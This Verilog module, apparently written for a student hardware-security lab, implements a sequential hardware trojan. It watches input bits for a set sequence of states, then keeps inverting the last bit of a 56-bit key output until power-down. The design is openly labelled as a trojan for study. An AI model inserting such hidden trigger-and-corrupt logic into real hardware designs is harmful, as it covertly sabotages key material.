// Group 2: Raj Patel, Zachary Rouviere, Evan Waxman
// Experiement 4 Part 3
// 9/17/21

// Description:
//	trojan_seq.v will implement a sequential trigger based on a
//	defined sequence of states. To implement the trigger, a shift
// 	register is used to check the history of states and is then
// 	compared with the trigger condition. If the condition is met,
//	the last bit of the key will be inverted until the board powers 
//	down.
`timescale 1ns/1ns

module  trojan_seq (
input					clk,
input					rst,
input		[55:0]	    key,
input		[1:32]	    trigger,
output reg	[55:0]	    payload
);

//	trigger condition definition (order of states)
parameter 	STATE0  = 2'b00, 
			STATE1	= 2'b11, 
			STATE2 	= 2'b01;

reg [5:0]	state_order;
reg [5:0] 	trigger_cond = {STATE0, STATE1, STATE2};
reg 		trojan_en;
reg			trojan_en_next;
reg [55:0]	payload_next;

//	sequential always block to set state_order and trojan_en reg, and payload output
always @(negedge clk) begin
	if (rst) begin
		state_order	<= #1 6'h00;
		trojan_en 	<= #1 1'b0;
		payload 	<= #1 key;
	end else begin
		state_order	<= #1 {state_order[3:0], trigger[1:2]};
		trojan_en 	<= #1 trojan_en_next;
		payload 	<= #1 payload_next; 
	end
end

// 	combinational always block to update trigger_en
always @(state_order, trigger_cond, trojan_en) begin
	trojan_en_next = trojan_en;
	payload_next = payload;

	if (state_order == trigger_cond) begin
		trojan_en_next = 1'b1;
	end

	if (trojan_en) begin
		payload_next <= #1 {key[55:1], ~key[0]};
	end else begin
		payload_next <= #1 key;
	end
end

endmodule